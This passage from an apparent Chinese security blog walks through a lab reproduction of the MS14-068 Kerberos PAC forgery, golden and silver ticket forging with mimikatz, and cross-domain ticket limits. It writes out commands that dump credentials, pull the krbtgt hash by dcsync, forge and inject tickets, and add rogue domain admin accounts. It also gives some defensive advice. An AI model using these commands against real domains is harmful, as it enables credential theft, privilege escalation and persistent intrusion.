alt="image-20220214223450215"></p><p><strong>KRB_AS_REP</strong></p><p>在AS发起请求之后，KDC（AS）将返回一张不包含有PAC的TGT票据给Client。在这里是tgt_a。</p><p><img src="/2022/03/04/MS14068/image-20220214223507725.png" alt="image-20220214223507725"></p><p>抓包可以看到这个以 268fdb 开头的 TGT 票据。</p><p><img src="/2022/03/04/MS14068/image-20220214223521417.png" alt="image-20220214223521417"></p><p><strong>KRB_TGS_REQ</strong></p><p>攻击脚本使用了两个关键函数来实现这个过程，首先通过build构造PAC，然后通过build_tgs_req函数构造TGS-REQ的内容。</p><p><img src="/2022/03/04/MS14068/image-20220214223650466.png" alt="image-20220214223650466"></p><p><strong>build_pac</strong></p><p>当Client接收到AS返回的不带有PAC的TGT之后通过脚本中的build_pac函数开始构造PAC。</p><p><img src="/2022/03/04/MS14068/image-20220214223711517.png" alt="image-20220214223711517"></p><p>这里我们重点关注一下 PAC 中的 chksum1 和 chksum2，也就是“PAC 的引入”中提到的 PAC 的两个数字签名 PAC_SERVER_CHECKSUM 和 PAC_PRIVSVR_CHECKSUM。 注意一下其中第一个参数 server_key[0]和 kdc_key[0]的值其实是程序指定的 RSA_MD5， 而 Key 的值为 None，但原则上来说这个加密方式是应该由 KDC 来确定的。也就是说加密 PAC_SERVER_CHECKSUM 和 PAC_PRIVSVR_CHECKSUM 这两个数字签名的 Key 应该分别是</p><p><img src="/2022/03/04/MS14068/image-20220214223729644.png" alt="image-20220214223729644"></p><p>同时在这个过程中我们也需要关注一下 user_sid 这个参数，build_pac 函数会将其分割， 然后重新构造高权限的 sid 的值。在这里 user_sid 的值为 S-1-5-21-4249968736-1423802980- 663233003-1104，分割之后 domain_sid 为 S-1-5-21-4249968736-1423802980-663233003， user_id 为 1104。</p><p><img src="/2022/03/04/MS14068/image-20220214223742596.png" alt="image-20220214223742596"></p><p>其中 512、520、518、519 分别为不同的组的 sid 号。513 为 DOMAIN USERS 组。通过这种方 式构造了包含高权限组 SID 的 PAC。</p><p><img src="/2022/03/04/MS14068/image-20220214223753866.png" alt="image-20220214223753866"></p><p><strong>build_tgs_req</strong></p><p>在build_tgs_req函数的参数中，authorization_data对应的为build_pac生成的pac。</p><p><img src="/2022/03/04/MS14068/image-20220214223809904.png" alt="image-20220214223809904"></p><p>这里将 PAC 传入 build_tgs_req 之后使用 subkey 将其加密。</p><p><img src="/2022/03/04/MS14068/image-20220214223820776.png" alt="image-20220214223820776"></p><p>而通过下图可以看到 subkey 其实是函数 generate_subkey 生成的一串 16 位的随机数。</p><p><img src="/2022/03/04/MS14068/image-20220214223831544.png" alt="image-20220214223831544"></p><p><img src="/2022/03/04/MS14068/image-20220214223836823.png" alt="image-20220214223836823"></p><p>那现在为止出现的问题有：</p><blockquote><p>A、在域中默认允许设置Include-pac的值为False（不能算漏洞，应该是微软对于某些特定场景的特殊考虑设计出的机制）；</p><p>B、PAC中的数字签名可以由Client端指定，并且Key的值可以为空；</p><p>C、PAC的加密方式也可以由Client指定，并且Key的值为generate_subkey函数生成的16位随机数；</p><p>D、构造的PAC中包含高权限组的SID内容。</p></blockquote><p>也就是说通过这几点Client完全伪造了一个PAC发送给KDC，并且KDC通过Client端在请求中指定的加密算法来解密伪造的PAC以及校验数字签名，并验证通过。</p><p>通过抓包可以看到在这个过程中将接收的TGT（268fdb开头）和加密方式为ARCFOUR-HMAC-MD5的PAC内容。</p><p><img src="/2022/03/04/MS14068/image-20220214223905906.png" alt="image-20220214223905906"></p><p><strong>KRB_TGS_REP</strong></p><p>KDC在根据对伪造的PAC验证成功之后，返回给Client端一有新的TGT，并且这个TGT会将Pykek生成的PAC包含在其中，这里正常情况下返回的其实是一张用于发送给Server端做认证的ST票据。</p><p><img src="/2022/03/04/MS14068/image-20220214223924213.png" alt="image-20220214223924213"></p><p>当 Pykek 工具接收到新的 TGT 之后就将其保存生成 ccache 文件。也就是说这时 Client 已 经获得了一张包含有高权限 PAC 内容的正常的 TGT 票据（564eab 开头）。</p><p><img src="/2022/03/04/MS14068/image-20220214223935716.png" alt="image-20220214223935716"></p><p>使用 Mimikatz 利用 TGT 访问 DC 共享文件夹 这时我们通过 mimikatz 来导入票证，并且用 dir//dc.yunying.lab/c$来访问域控的共享文件夹。</p><p><img src="/2022/03/04/MS14068/image-20220214223946266.png" alt="image-20220214223946266"></p><p>抓包可以看到这时 Client 端发起了两次 TGS-REQ 请求，重点关注一下第一次，此时用的票据 就是使用 mimikatz 导入的 TGT，也就是上面 KRB_TGS_REP 过程中返回的那个 tgt_b（564eab 开头）。</p><p><img src="/2022/03/04/MS14068/image-20220214223959527.png" alt="image-20220214223959527"></p><p>请求之后返回了一张针对 dc.yunying.lab（域控）的 CIFS 票据也就是正常流程中的 ST（Service Ticket）票据（234062 开头）：</p><p><img src="/2022/03/04/MS14068/image-20220214224016078.png" alt="image-20220214224016078"></p><p>这时在抓的包中发现并没有 AP_REQ 这个流程，是因为在 Kerberos 中 AP_REQ 这个过程放在 了服务的第一次请求中，这里是放在 SMB 的 Session Setup Request 中（其他协议同理，比如 HTTP 协议是放在 GET 请求中）。</p><p><img src="/2022/03/04/MS14068/image-20220214224130620.png" alt="image-20220214224130620"></p><p>然后在 SMB 的 Session Setup Response 中做出响应，也就是 AP-REP 这个流程。</p><p><img src="/2022/03/04/MS14068/image-20220214224142525.png" alt="image-20220214224142525"></p><p>到此为止 Client 能够越权访问域控的共享文件夹。</p><h2 id="下面我们总结一下通过上面的分析找到的微软所犯的三个错误："><a href="#下面我们总结一下通过上面的分析找到的微软所犯的三个错误：" class="headerlink" title="下面我们总结一下通过上面的分析找到的微软所犯的三个错误："></a>下面我们总结一下通过上面的分析找到的微软所犯的三个错误：</h2><h3 id="第一个错误："><a href="#第一个错误：" class="headerlink" title="第一个错误："></a>第一个错误：</h3><p> <strong>在KDC机构对PAC进行验证时，对于PAC尾部的签名算法，虽然原理上规定必须是带有Key的签名算法才可以，但微软在实现上，却允许任意签名算法，只要客户端指定任意签名算法，KDC服务器就会使用指定的算法进行签名验证。</strong></p><h3 id="第二个错误："><a href="#第二个错误：" class="headerlink" title="第二个错误："></a>第二个错误：</h3><p> <strong>PAC没有被放在TGT中，而是放在了TGS_REQ数据包的其它地方。但可笑的是，KDC在实现上竟然允许这样的构造，也就是说，KDC能够正确解析出没有放在其它地方的PAC信息。</strong></p><h3 id="第三个错误："><a href="#第三个错误：" class="headerlink" title="第三个错误："></a>第三个错误：</h3><p> <strong>只要TGS_REQ按照刚才漏洞要求设置，KDC服务器会做出令人吃惊的事情：它不仅会从Authenticator中取出来subkey把PAC信息解密并利用客户端设定的签名算法验证签名，同时将另外的TGT进行解密得到SessionKeya-kdc；</strong></p><p> <strong>在验证成功后，把解密的PAC信息的尾部，重新采用自身Server_key和KDC_key生成一个带Key的签名，把SessionKeya-kdc用subkey加密，从而组合成了一个新的TGT返回给Client-A</strong></p><p>整个大概流程就是    先请求一个不包含PAC的TGT  然后用域用户的sid来伪造高权限的sid构成PAC 然后通过tgs_req传给KDC  req_rep返回一个新的TGT  而不是ST   也正是这个高权限的TGT起到最后的作用</p><p>参考：<a href="https://www.freebuf.com/articles/system/197160.html">https://www.freebuf.com/articles/system/197160.html</a></p><p><a href="https://blog.csdn.net/zy_strive_2012/article/details/51698780">https://blog.csdn.net/zy_strive_2012/article/details/51698780</a></p>]]></content>
    
    
    <categories>
      
      <category>内网</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞复现</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>黄金票据和白银票据</title>
    <link href="/2022/03/04/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/"/>
    <url>/2022/03/04/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/</url>
    
    <content type="html"><![CDATA[<h2 id="黄金票据（Golden-Ticket）"><a href="#黄金票据（Golden-Ticket）" class="headerlink" title="黄金票据（Golden Ticket）"></a>黄金票据（Golden Ticket）</h2><p>Kerberos的认证流程就不多介绍了</p><h3 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h3><p>在AS_REQ &amp; AS_REP中，用户使用自身hash加密时间戳发送给KDC，KDC验证成功后返回用krbtgt hash加密的TGT票据。如果我们有krbtgt的hash，就可以自己给自己签发任意用户的tgt票据。</p><h3 id="利用前提："><a href="#利用前提：" class="headerlink" title="利用前提："></a>利用前提：</h3><ul><li>拿到域控(没错就是拿到域控QAQ),适合做权限维持</li><li>有krbtgt用户的hash值(aeshash ntlmhash等都可以,后面指定一下算法就行了)</li></ul><h3 id="条件要求："><a href="#条件要求：" class="headerlink" title="条件要求："></a>条件要求：</h3><ul><li>域名</li><li>域的SID 值</li><li>域的KRBTGT账户NTLM密码哈希</li><li>伪造用户名</li></ul><h3 id="实验流程"><a href="#实验流程" class="headerlink" title="实验流程"></a>实验流程</h3><p>金票的生成需要用到 krbtgt 的密码 HASH 值，可以通过 mimikatz 中的 lsadump::dcsync /domain:yunying.lab /user:krbtgt 命令获取 krbtgt 的值。如果已经通过其他方 式获取到了 KRBTGT HASH 也可以直接进行下一步。</p><p>因为本地环境原因 没复现起 就参考的：<a href="https://www.jianshu.com/p/4936da524040">https://www.jianshu.com/p/4936da524040</a></p><h4 id="一、伪造凭据，提升域内普通用户的权限"><a href="#一、伪造凭据，提升域内普通用户的权限" class="headerlink" title="一、伪造凭据，提升域内普通用户的权限"></a>一、伪造凭据，提升域内普通用户的权限</h4><p>我们现在以一个本地administrator用户登录域内的一个主机中。</p><p><img src="/2022/03/04/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/image-20220214010856407.png" alt="image-20220214010856407"></p><p>通过命令：net config workstation,可知域名为：cyberpeace和其他信息。</p><p><img src="/2022/03/04/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/image-20220214010910320.png" alt="image-20220214010910320"></p><p>通过命令：nltest /dsgetdc:域名,可知DC主机名为：scene。</p><p><img src="/2022/03/04/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/image-20220214010924517.png" alt="image-20220214010924517"></p><p>上传mimikatz,以管理员权限运行CMD,再去执行mimikatz：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">mimikatz.<span class="hljs-keyword">exe</span> <span class="hljs-string">&quot;privilege::debug&quot;</span> <span class="hljs-string">&quot;sekurlsa::logonpasswords&quot;</span> <span class="hljs-string">&quot;exit&quot;</span>&gt;<span class="hljs-built_in">log</span>.txt<br></code></pre></td></tr></table></figure><p>打开生成的log.txt可以看到有一个域内用户<code>devuser</code>,且密码是<code>HOTdev123456</code></p><p><img src="/2022/03/04/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/image-20220214010941368.png" alt="image-20220214010941368"></p><p>使用用户devuser登录到域内,whoami查看下当前用户为devuser：</p><p><img src="/2022/03/04/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/image-20220214010954297.png" alt="image-20220214010954297"></p><p>这里利用MS14-068来提权,先检查下是否有MS14-068, CVE编号CVE-2014-6324,补丁为 3011780 ： systeminfo |find “3011780”,如果返回为空就说明没有打补丁,存在漏洞,需要注意的是域内普通用户提权成功后是有时效性的。</p><p><img src="/2022/03/04/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/image-20220214011008677.png" alt="image-20220214011008677"></p><p>执行：dir /scene.cyberpeace.com/c$，提醒权限不够：</p><p><img src="/2022/03/04/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/image-20220214011019977.png" alt="image-20220214011019977"></p><p>上传mimikatz和MS14-068提权工具，<code>whoami /user</code>或者<code>whoami/all</code>查看devuser用户的suid：</p><p><img src="/2022/03/04/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/image-20220214011034788.png" alt="image-20220214011034788"></p><p>使用MS14-068伪造票据：<br> 执行命令：<code>C:/MS14-068&gt;MS14-068.exe -u devuser@cyberpeace.com -p HOTdev123456 -s S-1-5-21-9 7341123-1865264218-933115267-1108 -d scene.cyberpeace.com</code>，会在当前目录下生成一个凭证。</p><p>使用方法：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">ms14-<span class="hljs-number">068</span><span class="hljs-selector-class">.exe</span> -u 域成员名@域名 -p 域成员密码 -s 域成员sid -d 域控制器地址 <br></code></pre></td></tr></table></figure><p>使用mimikatz清空之前缓存的凭证，导入伪造的凭证：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp">mimikatz <span class="hljs-meta"># kerberos::purge  <span class="hljs-comment">//清空票据</span></span><br>mimikatz <span class="hljs-meta"># kerberos::ptc 票据文件地址</span><br></code></pre></td></tr></table></figure><p><img src="/2022/03/04/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/image-20220214011112203.png" alt="image-20220214011112203"></p><p>再输入<code>dir //scene.cyberpeace.com/c$</code>，发现访问成功，现在我们有域管的权限:</p><p><img src="/2022/03/04/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/image-20220214011123670.png" alt="image-20220214011123670"></p><p>添加域管用户aaa：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs csharp">net user aaa Qwe123... /<span class="hljs-keyword">add</span> /domain<br>net <span class="hljs-keyword">group</span> <span class="hljs-string">&quot;Domain Admins&quot;</span> aaa /<span class="hljs-keyword">add</span> /domain<br></code></pre></td></tr></table></figure><p><strong>其实这一步 如果有条件的话 直接在域控上操作  就不需要这提权 创建域管了</strong></p><h4 id="二、伪造金票"><a href="#二、伪造金票" class="headerlink" title="二、伪造金票"></a>二、伪造金票</h4><p>登录aaa域管用户，执行<code>whoami</code>可以看到是aaa用户：</p><p><img src="/2022/03/04/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/image-20220214011312427.png" alt="image-20220214011312427"></p><p>使用一下命令导出用户krbtgt的hash：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">mimikatz(commandline) <span class="hljs-comment"># privilege::debug</span><br>mimikatz(commandline) <span class="hljs-comment"># lsadump::dcsync /domain:cyberpeace.com /all /csv</span><br>mimikatz(commandline) <span class="hljs-comment"># lsadump::dcsync /domain:cyberpeace.com /user:krbtgt</span><br></code></pre></td></tr></table></figure><p><img src="/2022/03/04/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/image-20220214011334600.png" alt="image-20220214011334600"></p><p>再执行以下命令可以看到krbtgt用户的SID：</p><p><img src="/2022/03/04/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/image-20220214011358729.png" alt="image-20220214011358729"></p><p>利用mimikatz生成金票生成.kirbi文件并保存：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs cpp">mimikatz.exe <span class="hljs-string">&quot;kerberos::golden /admin:system /domain:cyberpeace.com /sid:S-1-5-21-97341123-1865264218-933115267 /krbtgt:95972cdf7b8dde854e74c1871f6d80a0 /ticket:ticket.kirbi&quot;</span> exit<br><br>/admin：伪造的用户名<br>/domain：域名称<br>/sid：SID值，注意是去掉最后一个-后面的值<br>/krbtgt：krbtgt的HASH值<br>/ticket：生成的票据名称    <span class="hljs-comment">//不是写入内存中的命令！</span><br></code></pre></td></tr></table></figure><p><img src="/2022/03/04/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/image-20220214011420209.png" alt="image-20220214011420209"></p><h4 id="三，金票的使用-普通域账户，利用黄金票据，创建域管账户"><a href="#三，金票的使用-普通域账户，利用黄金票据，创建域管账户" class="headerlink" title="三，金票的使用(普通域账户，利用黄金票据，创建域管账户)"></a>三，金票的使用(普通域账户，利用黄金票据，创建域管账户)</h4><p>登录域内普通用户，通过mimikatz中的kerberos::ptt功能将ticket.kirbi导入内存中。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css">mimikatz # kerberos::purge         <br>mimikatz # kerberos::ptt ticket.kirbi<br></code></pre></td></tr></table></figure><p><img src="/2022/03/04/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/image-20220214011457670.png" alt="image-20220214011457670"></p><p>此时尝试创建一个ccc的域管账号，命令执行成功：</p><p><img src="/2022/03/04/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/image-20220214011511599.png" alt="image-20220214011511599"></p><h4 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h4><p>防御措施如下：</p><ul><li>限制域管理员登录到除域控制器和少数管理服务器以外的任何其他计算机（不要让其他管理员登录到这些服务器）将所有其他权限委派给自定义管理员组。这大大降低了攻击者访问域控制器的Active Directory的ntds.dit。如果攻击者无法访问AD数据库（ntds.dit文件），则无法获取到KRBTGT帐户密码</li><li>禁用KRBTGT帐户，并保存当前的密码以及以前的密码。KRBTGT密码哈希用于在Kerberos票据上签署PAC并对TGT（身份验证票据）进行加密。如果使用不同的密钥（密码）对证书进行签名和加密，则DC（KDC）通过检查KRBTGT以前的密码来验证</li><li>建议定期更改KRBTGT密码（毕竟这是一个管理员帐户）。更改一次，然后让AD备份，并在12到24小时后再次更改它。这个过程应该对系统环境没有影响。这个过程应该是确保KRBTGT密码每年至少更改一次的标准方法</li><li>一旦攻击者获得了KRBTGT帐号密码哈希的访问权限，就可以随意创建黄金票据。通过快速更改KRBTGT密码两次，使任何现有的黄金票据（以及所有活动的Kerberos票据）失效。这将使所有Kerberos票据无效，并消除攻击者使用其KRBTGT创建有效金票的能力</li></ul><h2 id="银票SILVER-TICKET"><a href="#银票SILVER-TICKET" class="headerlink" title="银票SILVER TICKET"></a>银票SILVER TICKET</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>如果说黄金票据是伪造的TGT,那么白银票据就是伪造的ST。<br>在Kerberos认证的第三部，Client带着ST和Authenticator3向Server上的某个服务进行请求，Server接收到Client的请求之后,通过自己的Master Key 解密ST,从而获得 Session Key。通过 Session Key 解密 Authenticator3,进而验证对方的身份,验证成功就让 Client 访问server上的指定服务了。<br> 所以我们只需要知道Server用户的Hash就可以伪造出一个ST,且不会经过KDC,从而更加隐蔽，但是伪造的门票只对部分服务起作用,如cifs（文件共享服务），mssql，winrm（windows远程管理），DNS等等</p><h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><p>1.不需要与KDC进行交互 2.需要server的NTLM hash</p><p>利用前提：</p><ul><li>拿到目标机器hash(是目标机,不一定是域控)  相当于server</li></ul><p>条件要求：</p><ul><li>域名</li><li>域sid</li><li>目标服务器FQDN</li><li>可利用的服务</li><li>服务账号的NTML HASH</li><li>需要伪造的用户名</li></ul><h4 id="二、伪造银票"><a href="#二、伪造银票" class="headerlink" title="二、伪造银票"></a>二、伪造银票</h4><p>先添加的域管账号    这里不一定就要域管   只是实验用的域管</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs csharp">net user ccc Qwe1234/<span class="hljs-keyword">add</span> /domain<br>net <span class="hljs-keyword">group</span> <span class="hljs-string">&quot;Domain Admins&quot;</span> cccc /<span class="hljs-keyword">add</span> /domain<br></code></pre></td></tr></table></figure><p>登录上面创建的域管用户，用管理员权限打开CMD，cd 到 mimikatz 存放的目录，去执行mimikatz的命令，得到SID和NTLM，</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">mimikatz.<span class="hljs-keyword">exe</span> <span class="hljs-string">&quot;privilege::debug&quot;</span> <span class="hljs-string">&quot;sekurlsa::logonpasswords&quot;</span> <span class="hljs-string">&quot;exit&quot;</span>&gt;<span class="hljs-built_in">log</span>.txt<br></code></pre></td></tr></table></figure><p><img src="/2022/03/04/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/image-20220214012709895.png" alt="image-20220214012709895"></p><p>把HASH文件保存到本地，在重新登录到域内机器的本地账户，将hash文件和mimikatz复制进去：<br>先使用mimikatz清空票据，再导入伪造的票据,具体伪造票据的命令:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">kerberos::golden /domain:cyberpeace.com /sid:S-1-5-21-2718660907-658632824-2072795563 /target:scene.cyberpeace.com /service:cifs /rc4:9a68826fdc2811f20d1f73a471ad7b9a /user:<span class="hljs-built_in">test</span> /ptt<br></code></pre></td></tr></table></figure><p>使用方法：<br> <code>kerberos::golden /domain:&lt;域名&gt; /sid:&lt;域 SID&gt; /target:&lt;目标服务器主机名&gt; /service:&lt;服务类型&gt; /rc4:&lt;NTLM Hash&gt; /user:&lt;用户名&gt; /ptt</code></p><p>其中的用户名可以随便写</p><p>服务类型可以从以下内容中来进行选择，因为我们没有TGT去不断申请ticket，所以只能针对某一些服务来进行伪造</p><p><img src="/2022/03/04/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/image-20220214012843399.png" alt="image-20220214012843399"></p><p><img src="/2022/03/04/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/image-20220214012859781.png" alt="image-20220214012859781"></p><p>测试一下，成功执行<code>dir //scene.cyberpeace.com/c$</code> ,并且可以创建域管账号:</p><p><img src="/2022/03/04/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/image-20220214013019349.png" alt="image-20220214013019349"></p><h2 id="金票和银票的区别"><a href="#金票和银票的区别" class="headerlink" title="金票和银票的区别"></a>金票和银票的区别</h2><h3 id="获取的权限不同"><a href="#获取的权限不同" class="headerlink" title="获取的权限不同"></a>获取的权限不同</h3><p>金票：伪造的TGT，可以获取任意Kerberos的访问权限<br> 银票：伪造的ST，只能访问指定的服务，如CIFS</p><h3 id="认证流程不同"><a href="#认证流程不同" class="headerlink" title="认证流程不同"></a>认证流程不同</h3><p>金票：同KDC交互，但不同AS交互<br> 银票：不同KDC交互，直接访问Server</p><h3 id="加密方式不同"><a href="#加密方式不同" class="headerlink" title="加密方式不同"></a>加密方式不同</h3><p>金票：由krbtgt NTLM Hash 加密<br> 银票：由服务账号 NTLM Hash 加密</p><p>Golden Ticket 和Silver Ticket都会在日志，不同的是，Golden Ticket会在域控中留下日志，Silver Ticket 仅在目标系统留下日志，因为Silver Ticket 不与KDC产生交互</p><h2 id="Enhanced-Golden-Tickets"><a href="#Enhanced-Golden-Tickets" class="headerlink" title="Enhanced Golden Tickets"></a>Enhanced Golden Tickets</h2><p>在 Golden Ticket 部分说明可利用 krbtgt 的密码 HASH 值生成金票，从而能够获取域控权 限同时能够访问域内其他主机的任何服务。但是普通的金票不能够跨域使用，也就是说金票 的权限被限制在当前域内。</p><h3 id="普通金票的局限性"><a href="#普通金票的局限性" class="headerlink" title="普通金票的局限性"></a>普通金票的局限性</h3><p>为什么普通金票会被限制只能在当前域内使用？ 在上一篇文章中说到了域树和域林的概念，同时说到 YUNYING.LAB 为其他两个域 （NEWS.YUNYING.LAB 和 DEV.YUNYING.LAB）的根域，根域和其他域的最大的区别就是根域对 整个域林都有控制权。而域正是根据 Enterprise Admins 组（下文会说明）来实现这样的权限 划分。</p><p><img src="/2022/03/04/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/image-20220214015124778.png" alt="image-20220214015124778"></p><p>实验环境</p><p>根域：YUNYING.LAB</p><p>域控：DC.YUNYING.LAB</p><p>子域：NEWS.YUNYING.LAB</p><p>域控：NEWSDC.NEWS.YUNYING.LAB</p><p>子域：DEV.YUNYING.LAB</p><p>域控：DEVDC.DEV.YUNYING.LAB</p><p>操作系统均为Windows Server 2008 R2 x64</p><p>使用工具：</p><p>Mimikatz</p><p>实验流程：</p><p>首先使用mimikatz在NEWSDC（NEWS.YUNYING.LAB的域控）上生成普通的金票，真实环境会是在域内的主机中，这里方便演示所以在域控中，原理和结果是一样的。</p><p><img src="/2022/03/04/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/image-20220214015235826.png" alt="image-20220214015235826"></p><p>这里使用的是NEWS.YUNYING.LAB域的SID号，访问根域的DC共享文件夹被拒绝。</p><p><img src="/2022/03/04/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/image-20220214015248305.png" alt="image-20220214015248305"></p><p>下面说明下具体原因。</p><p><strong>Enterprise Admins组</strong></p><p>Enterprise Admins组是域中用户的一个组，只存在于一个林中的根域中，这个组的成员，这里也就是YUNYING.LAB中的Administrator用户（不是本地的Administrator，是域中的Administrator）对域有完全管理控制权。</p><p><img src="/2022/03/04/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/image-20220214015302371.png" alt="image-20220214015302371"></p><p>通过whoami命令在yunying.lab的域控上可以看到Enterprise Admins组的RID为519（最后三位）</p><p><img src="/2022/03/04/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/image-20220214015315827.png" alt="image-20220214015315827"></p><p><strong>Domain Admins组</strong></p><p>可以看到在子域中是不存在Enterprise Admins组的，在一个子域中权限最高的组就是Domain Admins组。截图是news.yunying.lab这个子域中的Administrator用户，这个Administrator有当前域的最高权限。</p><p><img src="/2022/03/04/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/image-20220214015334730.png" alt="image-20220214015334730"></p><p>通过whoami命令也可以看到在news.yunying.lab这个子域中没有Enterprise Admins组的SID号。</p><p><img src="/2022/03/04/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/image-20220214015351528.png" alt="image-20220214015351528"></p><p>在子域中使用mimikatz创建的黄金票据不能跨域使用的原因也就在这里，通过whoami可以看到YUNYING.LAB中Enterprise Admins组的SID号是：</p><p>S-1-5-21-4249968736-1423802980-663233003-519</p><p>而NEWS.YUNYING.LAB域中的SID号是：</p><p>S-1-5-21-3641416521-285861825-2863956705-XXX</p><p>mimikatz通过/sid选项接收SID号然后在尾部拼接RID号（512,519等），拼接之后生成的Enterprise Admins组的完整SID是：</p><p>S-1-5-21-3641416521-285861825-2863956705-519</p><p>而这个SID在整个域林中都是不存在的，所以在子域中通过mimikatz生成的金票无法跨域或者是访问其他域的资源。在一个域林中，域控权限不是终点，根域的域控权限才是域渗透的终点。</p><h3 id="突破限制"><a href="#突破限制" class="headerlink" title="突破限制"></a>突破限制</h3><p>普通的黄金票据被限制在当前域内，在2015年Black Hat USA中国外的研究者提出了突破域限制的增强版的黄金票据。通过域内主机在迁移时SIDHistory属性中保存的上一个域的SID值制作可以跨域的金票。这里没有迁移，直接拿根域的SID号做演示。</p><p><img src="/2022/03/04/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/image-20220214015429835.png" 